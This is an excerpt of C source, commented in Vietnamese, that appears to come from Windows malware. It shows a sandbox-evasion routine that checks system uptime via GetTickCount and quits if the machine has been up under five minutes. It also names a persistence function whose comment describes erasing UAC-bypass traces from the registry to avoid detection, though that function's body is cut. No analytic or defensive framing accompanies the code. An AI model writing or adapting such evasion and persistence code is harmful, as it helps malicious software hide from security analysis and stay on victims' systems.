...
// --- TIME-BASED LOGIC BOMB (ANTI-SANDBOX) ---
// Kiểm tra thời gian uptime của hệ thống để phát hiện sandbox
// Sandbox thường khởi động nhanh và có uptime ngắn
int checkSandboxTime() {
    DWORD uptime = GetTickCount() / 1000; // Thời gian từ khi boot tính bằng giây
    if (uptime < 300) { // Nếu uptime < 5 phút, có thể là sandbox
        return 1; // Phát hiện sandbox
    }
    return 0; 
}
...
void setupPersistence() {
    // Xóa bỏ dấu vết UAC Bypass trong registry để tránh bị phát hiện sau này
...
int main() {
    ...
    // Kiểm tra Sandbox dựa trên thời gian uptime
    if (checkSandboxTime()) {
        return 0;
    }
